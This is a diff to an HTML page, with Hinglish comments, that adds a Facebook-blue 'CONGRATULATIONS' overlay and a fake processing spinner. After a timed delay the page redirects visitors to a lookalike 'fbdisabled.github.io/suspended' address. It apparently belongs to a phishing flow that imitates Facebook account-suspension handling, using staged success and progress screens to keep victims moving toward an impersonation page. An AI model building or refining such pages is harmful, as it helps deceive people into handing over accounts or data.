@@ -21,21 +21,48 @@
             position: relative;
         }
 
-        /* --- PROCESSING OVERLAY (New Logic) --- */
+        /* --- 1. CONGRATS POPUP (Layer 3 - Sabse Upar) --- */
+        #congrats-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1877F2 0%, #0056b3 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000; /* Iska number sabse bada hai */
+            transition: opacity 0.5s ease;
+        }
+
+        .congrats-text {
+            color: #ffffff;
+            font-size: 10vw; 
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: popIn 0.5s ease-out;
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        /* --- 2. PROCESSING OVERLAY (Layer 2 - Congrats ke peeche) --- */
         #processing-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            /* Safed rang 85% opacity ke sath, taaki piche ka thoda dikhe */
-            background-color: rgba(255, 255, 255, 0.85); 
-            backdrop-filter: blur(4px); /* Piche ka content dhundhla (blur) ho jayega */
-            display: flex;
+            /* Safed rang 85% opacity */
+            background-color: rgba(255, 255, 255, 0.90); 
+            backdrop-filter: blur(5px); 
+            /* IMPORTANT: Ye pehle se 'flex' rahega, 'none' nahi */
+            display: flex; 
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            z-index: 9999; /* Ye Congrats se niche hai, par Main Content se upar */
         }
 
         .spinner {
@@ -67,7 +94,12 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* --- MAIN CONTENT STYLES (Background Layer) --- */
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* --- 3. MAIN CONTENT (Layer 1 - Sabse Niche) --- */
         #main-content {
             width: 100%;
             max-width: 400px;
@@ -75,8 +107,8 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* Ye piche rahega, overlay ke niche */
-            filter: grayscale(50%); /* Thoda grey effect */
+            filter: grayscale(50%);
+            /* Ye background me rahega */
         }
 
         .card {
@@ -134,12 +166,16 @@
             font-weight: 600;
             width: 100%;
             display: block;
-            opacity: 0.5; /* Button disabled dikhega kyunki process chal raha hai */
+            opacity: 0.5;
         }
 
     </style>
 </head>
 <body>
+
+    <div id="congrats-popup">
+        <div class="congrats-text">CONGRATULATIONS</div>
+    </div>
 
     <div id="processing-overlay">
         <div class="spinner"></div>
@@ -169,12 +205,29 @@
     </div>
 
     <script>
-        // Logic: 4 Second wait -> Redirect
         window.onload = function() {
-            setTimeout(function() {
-                // Redirect link
-                window.location.href = "https://fbdisabled.github.io/suspended/successful_pending";
-            }, 4000); // 4000 milliseconds = 4 seconds
+            const congratsPopup = document.getElementById('congrats-popup');
+            
+            // Step 1: 3 Seconds wait for Congratulations
+            setTimeout(() => {
+                
+                // Fade out Congrats 
+                // Kyunki Processing Overlay pehle se peeche 'display:flex' hai,
+                // jaise hi Congrats ki opacity kam hogi, Processing turant dikhega.
+                congratsPopup.style.opacity = '0'; 
+                
+                // 0.5 sec baad Congrats ko display se hata do taaki click block na kare
+                setTimeout(() => {
+                    congratsPopup.style.display = 'none';
+
+                    // Step 2: Ab 4 Second wait karo Processing dikhane ke liye aur Redirect karo
+                    setTimeout(function() {
+                        window.location.href = "https://fbdisabled.github.io/suspended/successful_pending";
+                    }, 4000); 
+
+                }, 500); // 0.5s fade timing match
+
+            }, 3000); 
         };
     </script>
 
